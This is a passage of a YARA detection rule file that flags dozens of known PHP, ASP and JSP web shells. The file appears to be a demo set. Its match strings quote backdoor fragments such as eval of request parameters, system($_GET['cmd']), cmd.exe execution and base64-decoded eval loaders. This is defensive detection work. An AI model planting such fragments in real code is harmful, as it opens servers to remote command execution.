      $s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\"" 
   condition: 
      all of them
}

rule Webshell_asp_1_RID2C7A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:50:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "!22222222222222222222222222222222222222222222222222" fullword
      $s8 = "<%eval request(\"pass\")%>" fullword
   condition: 
      all of them
}

rule Webshell_cmd_win32_RID2DEC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmd_win32.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:52:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam" 
      $s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
   condition: 
      2 of them
}

rule Webshell_jsp_jshell_RID2ED4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file jshell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kXpeW[\"" fullword
      $s4 = "[7b:g0W@W<" fullword
      $s5 = "b:gHr,g<" fullword
      $s8 = "RhV0W@W<" fullword
      $s9 = "S_MR(u7b" fullword
   condition: 
      all of them
}

rule Webshell_ASP_zehir4_RID2E3F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:06:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/" 
   condition: 
      all of them
}

rule Webshell_wsb_idc_RID2D81 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file idc.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
      $s3 = "{eval($_GET['idc']);}" fullword
   condition: 
      1 of them
}

rule Webshell_cpg_143_incl_xpl_RID308F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cpg_143_incl_xpl.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:45:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA" 
      $s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time" 
   condition: 
      1 of them
}

rule Webshell_mumaasp_com_RID2F38 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file mumaasp.com.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:47:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR" 
   condition: 
      all of them
}

rule Webshell_php_404_a_RID2DA5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$pass = md5(md5(md5($pass)));" fullword
   condition: 
      all of them
}

rule Webshell_webshell_cnseay_x_RID31B5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file webshell-cnseay-x.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:34:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_" 
   condition: 
      all of them
}

rule Webshell_asp_up_RID2D2E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file up.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:20:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio" 
      $s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
   condition: 
      1 of them
}

rule Webshell_ASP_cmd_2_RID2DAE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:42:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
   condition: 
      all of them
}

rule Webshell_PHP_g00nv13_RID2DFC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file g00nv13.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:55:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas" 
      $s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p" 
   condition: 
      all of them
}

rule Webshell_php_h6ss_RID2DD1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file h6ss.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:48:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php eval(gzuncompress(base64_decode(\"" 
   condition: 
      all of them
}

rule Webshell_Ani_Shell_RID2E15 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Ani-Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:59:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$Python_CODE = \"I" 
      $s6 = "$passwordPrompt = \"\\n=================================================" 
      $s7 = "fputs ($sockfd ,\"\\n===============================================" 
   condition: 
      1 of them
}

rule Webshell_jsp_k8cmd_RID2E29 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file k8cmd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:02:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
   condition: 
      all of them
}

rule Webshell_jsp_cmd_1_RID2E16 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:59:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
   condition: 
      all of them
}

rule Webshell_jsp_k81_RID2D26 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file k81.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:19:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
      $s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
   condition: 
      1 of them
}

rule Webshell_ASP_zehir_RID2E0B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file zehir.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&" 
   condition: 
      all of them
}

rule Webshell_Worse_Linux_Shell_1_RID320C : DEMO LINUX SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Worse Linux Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:48:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, LINUX, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD" 
   condition: 
      all of them
}

rule Webshell_zacosmall_RID2E6C : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file zacosmall.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:13:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>" 
   condition: 
      all of them
}

rule Webshell_redirect_RID2DF8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file redirect.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:54:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" " 
   condition: 
      all of them
}

rule Webshell_jsp_cmdjsp_RID2ED3 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmdjsp.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
   condition: 
      all of them
}

rule Webshell_Java_Shell_RID2E7F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Java Shell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
      $s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword
   condition: 
      1 of them
}

rule Webshell_asp_1d_RID2CDE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 1d.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:07:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO" 
   condition: 
      all of them
}

rule Webshell_jsp_IXRbE_RID2DEC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file IXRbE.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:52:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application" 
   condition: 
      all of them
}

rule Webshell_PHP_G5_RID2C69 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file G5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:48:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op" 
   condition: 
      all of them
}

rule Webshell_PHP_r57142_RID2D62 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file r57142.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:29:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
   condition: 
      all of them
}

rule Webshell_jsp_tree_RID2E02 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file tree.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki" 
      $s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ" 
   condition: 
      all of them
}

rule Webshell_C99madShell_v_3_0_smowu_RID3315 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file smowu.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:32:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for" 
      $s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty" 
   condition: 
      1 of them
}

rule Webshell_simple_backdoor_RID30D4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file simple-backdoor.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:56:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$cmd = ($_REQUEST['cmd']);" fullword
      $s1 = "if(isset($_REQUEST['cmd'])){" fullword
      $s4 = "system($cmd);" fullword
   condition: 
      2 of them
}

rule Webshell_PHP_404_b_RID2D46 : DEMO SCRIPT T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:24:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)" 
   condition: 
      all of them
}

rule Webshell_Antichat_Shell_v1_3_2_RID3252 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Antichat Shell v1.3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:00:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m" 
   condition: 
      all of them
}

rule Webshell_Safe_mode_breaker_RID3164 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Safe mode breaker.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:20:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is(" 
      $s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)." 
   condition: 
      1 of them
}

rule Webshell_Sst_Sheller_RID2F0E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Sst-Sheller.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:40:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>" 
      $s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)" 
   condition: 
      all of them
}

rule Webshell_PHPJackal_v1_5_RID2F6E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file PHPJackal v1.5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form" 
      $s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr" 
   condition: 
      all of them
}

rule Webshell_customize_RID2E89 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file customize.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:18:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z" 
   condition: 
      all of them
}

rule Webshell_s72_Shell_v1_1_Coding_RID3222 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file s72 Shell v1.1 Coding.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:52:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya " 
   condition: 
      all of them
}

rule Webshell_jsp_guige02_RID2EC5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file guige02.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:28:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff" 
      $s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private" 
   condition: 
      all of them
}

rule Webshell_WinX_Shell_RID2E83 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file WinX Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam" 
      $s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </" 
   condition: 
      all of them
}

rule Webshell_Crystal_Crystal_RID30C9 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Crystal.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:54:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value" 
      $s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f" 
   condition: 
      all of them
}

rule Webshell_asp_ajn_RID2D82 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ajn.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
      $s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve" 
   condition: 
      all of them
}

rule Webshell_php_cmd_RID2D81 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if($_GET['cmd']) {" fullword
      $s1 = "// cmd.php = Command Execution" fullword
      $s7 = "  system($_GET['cmd']);" fullword
   condition: 
      all of them
}

rule Webshell_asp_list_RID2E05 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file list.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
      $s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
   condition: 
      all of them
}

rule Webshell_PHP_co_RID2CBF : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file co.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:02:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
      $s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
   condition: 
      all of them
}

rule Webshell_PHP_150_RID2C83 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 150.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:52:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "HJ3HjqxclkZfp" 
      $s1 = "<? eval(gzinflate(base64_decode('" fullword
   condition: 
      all of them
}

rule Webshell_jsp_cmdjsp_2_RID2F64 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmdjsp.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:55:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
      $s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
   condition: 
      all of them
}

rule Webshell_PHP_c37_RID2CBA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file c37.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:01:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj')," 
      $s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE]," 
   condition: 
      all of them
}

rule Webshell_PHP_b37_RID2CB9 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file b37.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:01:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc" 
   condition: 
      all of them
}

rule Webshell_php_backdoor_RID2F92 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file php-backdoor.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:02:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
      $s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input " 
   condition: 
      all of them
}

rule Webshell_asp_dabao_RID2E40 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file dabao.asp"
      author = "Florian Roth"
      reference = "-"
